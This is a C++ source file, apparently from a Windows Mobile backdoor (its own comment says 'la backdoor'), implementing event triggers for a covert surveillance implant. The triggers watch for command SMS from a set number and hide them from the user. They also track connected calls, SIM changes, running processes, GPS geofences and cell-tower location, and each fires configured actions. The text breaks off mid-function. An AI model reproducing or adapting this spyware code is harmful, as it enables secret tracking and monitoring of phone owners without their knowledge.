#include "Events.h"
#include <connmgr.h>
#include <Connmgr_status.h>
#include <Iptypes.h>
#include <Iphlpapi.h>
#include <tapi.h>
#include <pm.h>
#include "Ril.h"
#include "CallBacks.h"

DWORD WINAPI OnTimer(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_TIMER);
	pTimerStruct myConf = (pTimerStruct)(MyData->pParams);
	unsigned __int64 time, tmp_time;
	UINT wait;
	WCHAR pathName[MAX_PATH] = {0};

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;
	}
	
	if (MyData->pParams == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnTimer event started\n", 5, FALSE);

	tmp_time = 0;
	time = GetTime();

	LOOP {
		switch (myConf->uType) {
			case CONF_TIMER_SINGLE:
				wait = myConf->Lo_Delay;

				if (DiffTime(GetTime(), time) >= wait) {
					statusObj->TriggerAction(MyData->uActionId);
					statusObj->ThreadEventStopped(MyData);
					return TRUE;
				}

				break;

			case CONF_TIMER_REPEAT:
				wait = myConf->Lo_Delay;
				tmp_time = GetTime();

				if (DiffTime(tmp_time, time) >= wait){
					time = tmp_time;
					statusObj->TriggerAction(MyData->uActionId);
				}

				break;

			case CONF_TIMER_DATE: // Passata la data, parte ogni volta che si avvia/riavvia la backdoor
				tmp_time = 0;
				tmp_time = myConf->Hi_Delay;
				tmp_time <<= 32;
				tmp_time |= myConf->Lo_Delay;

				if (GetTime() >= tmp_time) {
					statusObj->TriggerAction(MyData->uActionId);
					statusObj->ThreadEventStopped(MyData);
					DBG_TRACE(L"Debug - Events.cpp - OnTimer clean stop [0]\n", 5, FALSE);
					return TRUE;
				}

				break;

			case CONF_TIMER_DELTA: break;
				// XXX - Da implementare (Lo e Hi sono in FILETIME)
				/*FILETIME cft;
				HANDLE hMod = INVALID_HANDLE_VALUE;
				LARGE_INTEGER c_time;
				GetModuleFileName(NULL, pathName, MAX_PATH);
				hMod = CreateFile(pathName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				GetFileTime(hMod, &cft, NULL, NULL);
				c_time.HighPart = cft.dwHighDateTime;
				c_time.LowPart = cft.dwLowDateTime;
				GetSystemTimeAsFileTime(&t_ft);
				t_time.HighPart = t_ft.dwHighDateTime;
				t_time.LowPart = t_ft.dwLowDateTime;*/

				//if(c_time.QuadPart >= myConf->Hi_Delay)

			default: 
				statusObj->ThreadEventStopped(MyData);
				return TRUE;
				break;
		}

		if (EventSleep(MyData, 2000)) {
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnTimer clean stop [1]\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return TRUE;
}

DWORD WINAPI OnSms(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_SMS);
	HMODULE hSmsFilter;
	WCHAR wNumber[17], *pwText;
	DWORD dwNumLen, dwTextLen;
	BYTE *pParam;
	IpcMsg *pMsg;
	Observer *observerObj = Observer::self();

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;
	}

	// Carichiamo l'evento solo se la DLL e' presente
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter == NULL) {
		statusObj->ThreadEventStopped(MyData);
		DBG_TRACE(L"Debug - Events.cpp - OnSms [SMS dll not found, exiting]\n", 5, FALSE);
		return TRUE;
	}

	FreeLibrary(hSmsFilter);

	if (observerObj == NULL || MyData->pParams == NULL) {
		statusObj->ThreadEventStopped(MyData);
		DBG_TRACE(L"Debug - Events.cpp - OnSms [Observer not found or no params, exiting]\n", 5, FALSE);
		return TRUE;
	}

	pParam = (BYTE *)MyData->pParams;

	// Lunghezza del numero di telefono (in byte + NULL WCHAR)
	CopyMemory(&dwNumLen, pParam, sizeof(dwNumLen)); pParam += sizeof(dwNumLen);

	// Copiamo il numero di telefono
	CopyMemory(wNumber, pParam, (dwNumLen > 16 * sizeof(WCHAR)) ? 16 * sizeof(WCHAR) : dwNumLen);
	pParam += dwNumLen;

	// Lunghezza del messaggio (in byte + NULL WCHAR)
	CopyMemory(&dwTextLen, pParam, sizeof(dwTextLen));
	pParam += sizeof(dwTextLen);

	pwText = (WCHAR *)new(std::nothrow) BYTE[dwTextLen + 1];

	if (pwText == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	ZeroMemory(pwText, dwTextLen + 1);

	// Copiamo il messaggio
	CopyMemory(pwText, pParam, dwTextLen);

	// Registriamoci all'observer
	if (observerObj->Register(GetCurrentThreadId()) == FALSE) {
		delete[] pwText;
		statusObj->ThreadEventStopped(MyData);
		DBG_TRACE(L"Debug - Events.cpp - OnSms [cannot register to Observer, exiting]\n", 5, FALSE);
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnSms event started\n", 5, FALSE);

	// La lunghezza del numero e dell'sms include anche il NULL-terminatore.
	LOOP {
		// Se abbiamo un messaggio nella coda...
		pMsg = (pIpcMsg)observerObj->GetMessage();
	
		if (pMsg != NULL) {
			DWORD dwSmsNumberLen, dwSmsTextLen;
			BYTE *pSmsNum, *pSmsText, *pTmp;

			// Formato messaggio: Lunghezza Numero | Numero | Lunghezza Messaggio | Messaggio
			pTmp = &pMsg->Msg[0];
			CopyMemory(&dwSmsNumberLen, pTmp, sizeof(dwSmsNumberLen)); 
			pTmp += sizeof(dwSmsNumberLen);

			pSmsNum = pTmp;
			pTmp += dwSmsNumberLen;

			CopyMemory(&dwSmsTextLen, pTmp, sizeof(dwSmsTextLen)); 
			pTmp += sizeof(dwSmsTextLen);

			pSmsText = pTmp;
			pTmp += dwSmsTextLen;

			// Vediamo se e' il nostro messaggio
			// dwSmsNumberLen == dwNumLen && RtlEqualMemory(pSmsNum, wNumber, dwNumLen)
			if (wcsstr((WCHAR *)pSmsNum, wNumber) && 
				!_wcsnicmp((WCHAR *)pSmsText, pwText, (dwTextLen / sizeof(WCHAR)) - 1)) {
				observerObj->MarkMessage(GetCurrentThreadId(), IPC_HIDE, TRUE);
				statusObj->TriggerAction(MyData->uActionId);
#ifdef _DEBUG
				wstring strDebug = L"Debug - Events.cpp - OnSms msg: ";
				strDebug += (PWCHAR)pSmsText;
				strDebug += L" number: ";
				strDebug += (PWCHAR)pSmsNum;
				strDebug += L" marked as Hidden\n";

				DBG_TRACE((PWCHAR)strDebug.c_str(), 5, FALSE);
#endif
			} else {
				observerObj->MarkMessage(GetCurrentThreadId(), IPC_PROCESS, FALSE);
#ifdef _DEBUG
				wstring strDebug = L"Debug - Events.cpp - OnSms msg: ";
				strDebug += (PWCHAR)pSmsText;
				strDebug += L" number: ";
				strDebug += (PWCHAR)pSmsNum;
				strDebug += L" marked as Process\n";

				DBG_TRACE((PWCHAR)strDebug.c_str(), 5, FALSE);
#endif
			}
		}

		if (EventSleep(MyData, 2000)) {
			delete[] pwText;
			observerObj->UnRegister(GetCurrentThreadId());

			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnSms clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	observerObj->UnRegister(GetCurrentThreadId());

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

DWORD WINAPI OnCall(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_CALL);

	HLINEAPP hLineApp;
	HLINE hLineOpened = NULL;
	DWORD dwPhoneNumDevs = 0, dwApiVersion = TAPI_CURRENT_VERSION;
	LINEINITIALIZEEXPARAMS liep;
	LINEMESSAGE lineMess;
	BYTE *pParam;
	WCHAR CheckPhoneNumber[32];
	UINT uExitAction, uNumLen, i;
	BOOL bConnected = FALSE;

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;	
	}

	if (MyData->pParams == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	// DWORD id azione sull'uscita | DWORD lunghezza numero di tel | WCHAR numero telefono
	if (MyData->uParamLength < sizeof(uExitAction)) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	pParam = (BYTE *)MyData->pParams;

	// Exit action
	CopyMemory(&uExitAction, pParam, sizeof(uExitAction)); pParam += sizeof(uExitAction);

	// Lunghezza del numero di telefono (in byte + NULL WCHAR)
	CopyMemory(&uNumLen, pParam, sizeof(pParam)); pParam += sizeof(pParam);

	// Copiamo il numero di telefono
	CopyMemory(CheckPhoneNumber, pParam, (uNumLen > 16 * sizeof(WCHAR)) ? 16 * sizeof(WCHAR) : uNumLen);

	ZeroMemory(&liep, sizeof(liep));
	liep.dwTotalSize = sizeof(LINEINITIALIZEEXPARAMS);
	liep.dwOptions   = LINEINITIALIZEEXOPTION_USEEVENT;

	if (lineInitializeEx(&hLineApp, 0, NULL, TEXT("ExTapi_Lib"), &dwPhoneNumDevs, &dwApiVersion, &liep)) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	for (i = 0; i < dwPhoneNumDevs; i++) {
		LINEEXTENSIONID extensionID;
		ZeroMemory(&extensionID, sizeof(LINEEXTENSIONID));
		lineNegotiateAPIVersion(hLineApp, i, 0x00010003, TAPI_CURRENT_VERSION, &dwApiVersion, &extensionID);
	}

	LINECALLPARAMS lineCallParams;
	HCALL hCall = NULL;

	ZeroMemory(&lineCallParams, sizeof(lineCallParams));
	lineCallParams.dwTotalSize = sizeof(lineCallParams);
	lineCallParams.dwBearerMode = LINEBEARERMODE_VOICE;
	lineCallParams.dwAddressMode = LINEADDRESSMODE_DIALABLEADDR;
	lineCallParams.dwCallParamFlags = LINECALLPARAMFLAGS_IDLE;
	lineCallParams.dwMediaMode = 0;

	if (lineOpen(hLineApp, 0, &hLineOpened, dwApiVersion, 0, 0x100, LINECALLPRIVILEGE_MONITOR | 
			LINECALLPRIVILEGE_OWNER, LINEMEDIAMODE_INTERACTIVEVOICE | LINEMEDIAMODE_DATAMODEM, 
			&lineCallParams)) {
		lineShutdown(hLineApp);
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnCall event started\n", 5, FALSE);

	BYTE buffer[sizeof(LINECALLINFO) * 2];
	LPLINECALLINFO pCallInfo = (LPLINECALLINFO)buffer;

	pCallInfo->dwTotalSize = sizeof(buffer);

	// Attendiamo che arrivi o sia effettuata una chiamata
	LOOP {
		if (WaitForSingleObject(liep.Handles.hEvent, 1000) == WAIT_TIMEOUT) {
			if (statusObj->EventQueryStop(MyData)) {
				lineClose(hLineOpened);
				lineShutdown(hLineApp);
				statusObj->ThreadEventStopped(MyData);
				DBG_TRACE(L"Debug - Events.cpp - OnCall clean stop\n", 5, FALSE);
				return TRUE;
			}

			continue;
		}

		// Attendiamo 200ms per l'arrivo del messaggio
		LONG lineResult = lineGetMessage(hLineApp, &lineMess, 200);

		if (lineResult == LINEERR_INVALAPPHANDLE) { // Proviamo a riaprire la linea
			// Se non ci riusciamo, stoppiamo l'evento
			if (lineOpen(hLineApp, 0, &hLineOpened, dwApiVersion, 0, 0x100, LINECALLPRIVILEGE_MONITOR | 
				LINECALLPRIVILEGE_OWNER, LINEMEDIAMODE_INTERACTIVEVOICE | LINEMEDIAMODE_DATAMODEM, &lineCallParams)) {
					lineShutdown(hLineApp);
					statusObj->ThreadEventStopped(MyData);
					return TRUE;
			}
		}

		// In caso di errore, continuiamo
		if (lineResult < 0)
			continue;

		// Chiamata appena chiusa
		if (lineMess.dwMessageID == LINE_CALLSTATE && lineMess.dwParam1 == LINECALLSTATE_DISCONNECTED && bConnected == TRUE) {
			bConnected = FALSE;
			statusObj->TriggerAction(uExitAction);
			continue;
		}

		// Questo messaggio non ci interessa, vogliamo solo che chiamate connesse
		if (lineMess.dwMessageID != LINE_CALLSTATE || lineMess.dwParam1 != LINECALLSTATE_CONNECTED)
			continue;

		hCall = (HCALL)lineMess.hDevice; // Prendiamo l'handle della chiamata!

		if (lineGetCallInfo(hCall, pCallInfo)) 
			continue;

		// Vediamo se la chiamata e' in entrata o in uscita
		WCHAR *pwNumber = NULL;

		// In entrata
		if (pCallInfo->dwCallerIDFlags == LINECALLPARTYID_ADDRESS && pCallInfo->dwCallerIDOffset)
			pwNumber = (WCHAR *)(((BYTE *)pCallInfo) + pCallInfo->dwCallerIDOffset);

		// In uscita
		if (pCallInfo->dwCalledIDFlags == LINECALLPARTYID_ADDRESS && pCallInfo->dwCalledIDOffset)
			pwNumber = (WCHAR *)(((BYTE *)pCallInfo) + pCallInfo->dwCalledIDOffset);

		if (pwNumber == NULL)
			continue;

		// Le chiamate in uscita non hanno necessariamente il codice +XX quindi usiamo wcsstr()
		if (bConnected == FALSE && (uNumLen == 0 || wcsstr(pwNumber, CheckPhoneNumber))) {
			bConnected = TRUE;
			statusObj->TriggerAction(MyData->uActionId);
			continue;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

DWORD WINAPI OnConnection(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_CONNECTION);

	HRESULT hResult;
	HANDLE hConnManager = INVALID_HANDLE_VALUE;
	UINT uExitAction;
	MSG msg;

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;	
	}

	if (MyData->pParams == NULL || MyData->uParamLength < sizeof(uExitAction)) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	// Azione da eseguire alla disconnessione
	CopyMemory((BYTE *)&uExitAction, MyData->pParams, sizeof(uExitAction));

	// Attendiamo che il ConnectionManager sia pronto
	hConnManager = ConnMgrApiReadyEvent();

	if (hConnManager == NULL || hConnManager == INVALID_HANDLE_VALUE) {
		DBG_TRACE(L"Debug - Events.cpp - OnConnection FAILED [Connection Manager not present]\n", 5, FALSE);
		return TRUE;
	}

	if (WaitForSingleObject(hConnManager, 5000) != WAIT_OBJECT_0) {
		CloseHandle(hConnManager);
		DBG_TRACE(L"Debug - Events.cpp - OnConnection FAILED [Connection Manager not ready]\n", 5, FALSE);
		return TRUE;
	}

	CloseHandle(hConnManager);

	HWND hWin = CreateWindow(L"STATIC", L"Window", 0, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);

	if (hWin == NULL) {
		DBG_TRACE(L"Debug - Events.cpp - OnConnection FAILED [Cannot create notification window]\n", 5, FALSE);
		return TRUE;
	}

	UINT uStatusChange = RegisterWindowMessage(CONNMGR_STATUS_CHANGE_NOTIFICATION_MSG);

	if (uStatusChange == 0) {
		DestroyWindow(hWin);
		DBG_TRACE(L"Debug - Events.cpp - OnConnection FAILED [Cannot register window message]\n", 5, FALSE);
		return TRUE;
	}

	hResult = ConnMgrRegisterForStatusChangeNotification(TRUE, hWin);

	if (hResult != S_OK) {
		DestroyWindow(hWin);
		DBG_TRACE(L"Debug - Events.cpp - OnConnection FAILED [Cannot register for notifications]\n", 5, FALSE);
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnConnection event started\n", 5, FALSE);

	LOOP {
		if (PeekMessage(&msg, hWin, 0, 0, PM_REMOVE)) {
			if (msg.message == uStatusChange) {
				switch (msg.wParam) {
					case CONNMGR_STATUS_CONNECTED:
						if (EventSleep(MyData, 40000)) {
							ConnMgrRegisterForStatusChangeNotification(FALSE, hWin);
							DestroyWindow(hWin);
							statusObj->ThreadEventStopped(MyData);
							DBG_TRACE(L"Debug - Events.cpp - OnConnection clean stop [0]\n", 5, FALSE);
							return TRUE;
						}

						DBG_TRACE(L"Debug - Events.cpp - OnConnection triggered [In Action]\n", 5, FALSE);
						statusObj->TriggerAction(MyData->uActionId);
						break;

					case CONNMGR_STATUS_DISCONNECTED:
						DBG_TRACE(L"Debug - Events.cpp - OnConnection triggered [Out Action]\n", 5, FALSE);
						// Si potrebbe eseguire l'exit action qui
						statusObj->TriggerAction(uExitAction);
						break;

					default: break;
				}
			}
			DispatchMessage(&msg);
		}

		if (EventSleep(MyData, 3000)) {
			ConnMgrRegisterForStatusChangeNotification(FALSE, hWin);
			DestroyWindow(hWin);
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnConnection clean stop [0]\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

// Il formato dei parametri e' il seguente:
// Azione da triggerare a processo TERMINATO (TRIGGER_ACTION(myData->pParams))
// Tipo di ricerca da fare (window title [1] o nome del processo [0])
// Nome del processo in WCHAR NULL-terminato
// Abbiamo un thread per processo, tuttavia il thread e' estremamente lightweight poiche'
// effettua solo un busy-cycle, il resto viene fatto tutto dalla classe singleton Process.
DWORD WINAPI OnProcess(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_PROCESS);
	UINT uTerminate, uType, uNameLen;
	WCHAR *wName = NULL;
	BOOL bActive = FALSE;
	BYTE *pTmp;

	Process *processObj = Process::self();

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;
	}
		
	if (processObj == NULL || MyData->pParams == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnProcess event started\n", 5, FALSE);

	// Azione da triggerare a processo TERMINATO
	pTmp = (BYTE *)MyData->pParams;
	CopyMemory(&uTerminate, pTmp, sizeof(uTerminate)); pTmp += sizeof(uTerminate);

	// Il tipo sara' a 1 se dobbiamo cercare il titolo della finestra, 
	// a 0 se dobbiamo cercare il nome del processo.
	CopyMemory(&uType, pTmp, sizeof(uType)); pTmp += sizeof(uType);

	// Leggiamo la lunghezza del nome (ma non lo usiamo per ora, il nome e' NULL terminato)
	CopyMemory(&uNameLen, pTmp, sizeof(uNameLen)); pTmp += sizeof(uNameLen);
 
	// Prendiamo il puntatore al nome del processo/finestra
	wName = (WCHAR *)(pTmp);

	if (wName == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
		return 0;
	}

	LOOP {
		switch (uType) {
			case 0: // Processo
				if (bActive == TRUE && processObj->IsProcessRunningW(wName) == FALSE) {
					bActive = FALSE;

					if (uTerminate != CONF_ACTION_NULL) {
						DBG_TRACE(L"Debug - Events.cpp - OnProcess event detected, triggering exit action!\n", 6, FALSE);
						statusObj->TriggerAction(uTerminate); // Processo terminato
					}
				} else if (bActive == FALSE && processObj->IsProcessRunningW(wName) == TRUE) {
					DBG_TRACE(L"Debug - Events.cpp - OnProcess event detected, triggering action!\n", 6, FALSE);
					bActive = TRUE;
					statusObj->TriggerAction(MyData->uActionId); // Processo attivo
				}

				break;

			case 1: // Finestra
				if (bActive == TRUE && processObj->IsWindowPresent(wName) == FALSE) {
					bActive = FALSE;

					if (uTerminate != CONF_ACTION_NULL) {
						DBG_TRACE(L"Debug - Events.cpp - OnProcess window detected, triggering exit action!\n", 6, FALSE);
						statusObj->TriggerAction(uTerminate); // Finestra distrutta
					}
				} else if (bActive == FALSE && processObj->IsWindowPresent(wName) == TRUE) {
					DBG_TRACE(L"Debug - Events.cpp - OnProcess window detected, triggering action!\n", 6, FALSE);
					bActive = TRUE;
					statusObj->TriggerAction(MyData->uActionId); // Finestra creata
				}

				break;

			default: 
				break;
		}

		if (EventSleep(MyData, 1000)) {
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnProcess clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

DWORD WINAPI OnSimChange(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_SIM_CHANGE);
	Device *deviceObj = Device::self();
	Log log;
	WCHAR *pwMarkup = NULL;
	UINT uLen = 0;

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;	
	}

	if (deviceObj == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnSimChange event started\n", 5, FALSE);

	// Prendiamo l'IMSI attuale e mettiamolo in un markup
	if (deviceObj->GetImsi().size()) {
		// Scriviamo il markup soltanto se non esiste
		if (log.IsMarkup(EVENT_SIM_CHANGE) == FALSE) {
			if (log.WriteMarkup(EVENT_SIM_CHANGE, (BYTE *)deviceObj->GetImsi().c_str(), 
				deviceObj->GetImsi().size() * sizeof(WCHAR)) == FALSE) {
				statusObj->ThreadEventStopped(MyData);
				DBG_TRACE(L"Debug - Events.cpp - OnSimChange [Cannot write markup]\n", 5, FALSE);
				return TRUE;
			}
		}
	}

	LOOP {
		if (EventSleep(MyData, 60000 * 5)) {
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnSimChange clean stop\n", 5, FALSE);
			return TRUE;
		}

		pwMarkup = (WCHAR *)log.ReadMarkup(EVENT_SIM_CHANGE, &uLen);

		// Se non abbiamo un markup, creiamolo
		if (pwMarkup == NULL && deviceObj->GetImsi().size()) {
			log.WriteMarkup(EVENT_SIM_CHANGE, (BYTE *)deviceObj->GetImsi().c_str(), 
				deviceObj->GetImsi().size() * sizeof(WCHAR));

			pwMarkup = (WCHAR *)log.ReadMarkup(EVENT_SIM_CHANGE, &uLen);
		}

		// Se abbiamo letto l'IMSI ed esiste il markup, confrontiamo i dati
		if (deviceObj->GetImsi().size() && pwMarkup) {
			// Se i due markup sono diversi
			if (wcsicmp(deviceObj->GetImsi().c_str(), pwMarkup)) {
				statusObj->TriggerAction(MyData->uActionId);

				// Aggiorna il markup
				log.WriteMarkup(EVENT_SIM_CHANGE, (BYTE *)deviceObj->GetImsi().c_str(), 
					deviceObj->GetImsi().size() * sizeof(WCHAR));
			}
		}

		if (pwMarkup) {
			delete[] pwMarkup;
			pwMarkup = NULL;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

// MANAGEMENT - Le coordinate vanno inserite in gradi decimali!!
DWORD WINAPI OnLocation(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_LOCATION);
	DOUBLE latOrigin, lonOrigin, latActual, lonActual, distance;
	INT confDistance;
	UINT uExitAction;
	BOOL bLocation = FALSE;
	GPS *gpsObj = NULL;
	GPS_POSITION gps;

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;	
	}

	if (MyData->pParams == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	// DWORD id azione sull'uscita | DWORD metri | 2DWORD Long | 2DWORD Lat
	if (MyData->uParamLength != sizeof(latOrigin) + sizeof(lonOrigin) + (2 * sizeof(UINT))) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	// Azione da eseguire sull'uscita dalle coordinate
	CopyMemory((BYTE *)&uExitAction, MyData->pParams, sizeof(uExitAction));

	// Distanza dall'origine in metri
	CopyMemory((BYTE *)&confDistance, (BYTE *)(MyData->pParams) + sizeof(uExitAction), sizeof(confDistance));

	// Latitudine del punto di origine
	CopyMemory((BYTE *)&latOrigin, (BYTE *)(MyData->pParams) + (2 * sizeof(uExitAction)), sizeof(latOrigin));

	// Longitudine del punto di origine
	CopyMemory((BYTE *)&lonOrigin, (BYTE *)(MyData->pParams) + (2 * sizeof(uExitAction) + sizeof(latOrigin)), sizeof(lonOrigin));

	// E' singleton e non va distrutta
	gpsObj = GPS::self(30000, 1000);

	if (gpsObj == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	if (gpsObj->Start() == FALSE) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	latActual = 0.0f;
	lonActual = 0.0f;

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnLocation event started\n", 5, FALSE);

	LOOP {
		if (gpsObj->getGPS(&gps)) {
			// Scriviamo il tipo di struttura e poi i dati
			DWORD dwFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;
	
			// Ok abbiamo una posizione valida, diamoci dentro con la geometria sferica
			if ((gps.dwValidFields & dwFields) == dwFields  && gps.FixType == GPS_FIX_3D) {

				distance = gpsObj->VincentFormula(latOrigin, lonOrigin, gps.dblLatitude, gps.dblLongitude);

				// Se la distance e' esattamente 0.0f allora la funzione non e' riuscita a
				// convergere, percio' non abbiamo una stima attendibile
				if (distance != 0.0f) {
					if ((INT)distance <= confDistance) {
						if (bLocation == FALSE) {
							DBG_TRACE(L"Debug - Events.cpp - OnLocation event [IN action triggered]\n", 5, FALSE);
							statusObj->TriggerAction(MyData->uActionId);
							bLocation = TRUE;
						}
					} else {
						if (bLocation == TRUE) {
							DBG_TRACE(L"Debug - Events.cpp - OnLocation event [OUT action triggered]\n", 5, FALSE);
							statusObj->TriggerAction(uExitAction); // Siamo usciti dalla location
							bLocation = FALSE;
						}
					}
				}
			}
		}

		if (EventSleep(MyData, 20000)) {
			gpsObj->Stop();
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnLocation clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

DWORD WINAPI OnCellId(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_CELLID);
	UINT uExitAction, uCountry, uNetwork, uArea, uCellid;
	BOOL bCell = FALSE;
	Cell *cellObj = NULL;
	Device *deviceObj = Device::self();
	RILCELLTOWERINFO rilCell;
	DWORD dwMCC, dwMNC;

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;
	}
		
	if (deviceObj == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	// DWORD id azione sull'uscita | MOBILECOUNTRYCODE | MOBILENETWORKCODE | LOCATIONAREACODE | CELLID
	if (MyData->pParams == NULL || MyData->uParamLength != sizeof(UINT) * 5) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	// Azione da eseguire sull'uscita dalle coordinate
	CopyMemory((BYTE *)&uExitAction, MyData->pParams, sizeof(uExitAction));

	// Distanza dall'origine in metri
	CopyMemory((BYTE *)&uCountry, (BYTE *)(MyData->pParams) + sizeof(uExitAction), sizeof(uCountry));

	// Latitudine del punto di origine
	CopyMemory((BYTE *)&uNetwork, (BYTE *)(MyData->pParams) + (2 * sizeof(uExitAction)), sizeof(uNetwork));

	// Longitudine del punto di origine
	CopyMemory((BYTE *)&uArea, (BYTE *)(MyData->pParams) + (3 * sizeof(uExitAction)), sizeof(uArea));

	// Longitudine del punto di origine
	CopyMemory((BYTE *)&uCellid, (BYTE *)(MyData->pParams) + (4 * sizeof(uExitAction)), sizeof(uCellid));

	// E' singleton e non va distrutta
	cellObj = Cell::self(30000);

	if (cellObj == NULL) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	if (cellObj->Start() == FALSE) {
		statusObj->ThreadEventStopped(MyData);
		return TRUE;
	}

	deviceObj->RefreshData();

	// Prendiamo il MCC ed il MNC
	dwMCC = deviceObj->GetMobileCountryCode();
	dwMNC = deviceObj->GetMobileNetworkCode();

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnCellId event started\n", 5, FALSE);

	LOOP {
		if (cellObj->getCELL(&rilCell)) {
			// Scriviamo il tipo di struttura e poi i dati
			DWORD dwFields =  RIL_PARAM_CTI_LOCATIONAREACODE | RIL_PARAM_CTI_CELLID;

			// Se non abbiamo MCC e MNC, usiamo quelli che abbiamo derivato dall'IMSI
			if (rilCell.dwMobileCountryCode == 0)
				rilCell.dwMobileCountryCode = dwMCC;

			if (rilCell.dwMobileNetworkCode == 0)
				rilCell.dwMobileNetworkCode = dwMNC;

 			if ((rilCell.dwParams & dwFields) == dwFields) {
				if (((rilCell.dwMobileCountryCode == uCountry || uCountry == -1) && 
					(rilCell.dwMobileNetworkCode == uNetwork || uNetwork == -1) &&
					(rilCell.dwLocationAreaCode == uArea || uArea == -1) && 
					(rilCell.dwCellID == uCellid || uCellid == -1)) && bCell == FALSE) {
						bCell = TRUE;

						DBG_TRACE(L"Debug - Events.cpp - OnCellId event [IN action triggered]\n", 5, FALSE);
						statusObj->TriggerAction(MyData->uActionId);
				}

				if (((uCountry != -1 && rilCell.dwMobileCountryCode != uCountry) || 
					(uNetwork != -1 && rilCell.dwMobileNetworkCode != uNetwork) ||
					(uArea != -1 && rilCell.dwLocationAreaCode != uArea) || 
					(uCellid != -1 && rilCell.dwCellID != uCellid)) && bCell == TRUE) {
						bCell = FALSE;

						DBG_TRACE(L"Debug - Events.cpp - OnCellId event [OUT action triggered]\n", 5, FALSE);
						statusObj->TriggerAction(uExitAction);
				}
			}
		}

		if (EventSleep(MyData, 20000)) {
			cellObj->Stop();
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnCellId clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

DWORD WINAPI OnAC(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_AC);

	const SYSTEM_POWER_STATUS_EX2 *pBattery = NULL;
	BOOL bAC = FALSE;
	DWORD dwAcStatus = 0;
	UINT uExitAction;
	Device *deviceObj = Device::self();

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;	
	}

	if (deviceObj == NULL) {
		return TRUE;
	}

	// DWORD azione in uscita dall'AC
	if (MyData->pParams == NULL || MyData->uParamLength != sizeof(uExitAction)) {
		return TRUE;
	}

	// Azione da eseguire sull'uscita dallo stato AC
	CopyMemory((BYTE *)&uExitAction, MyData->pParams, sizeof(uExitAction));

	deviceObj->RefreshBatteryStatus();
	pBattery = deviceObj->GetBatteryStatus();
	dwAcStatus = pBattery->ACLineStatus;

	if (deviceObj->RegisterPowerNotification(AcCallback, (DWORD)&dwAcStatus) == FALSE) {
		return TRUE;
	}

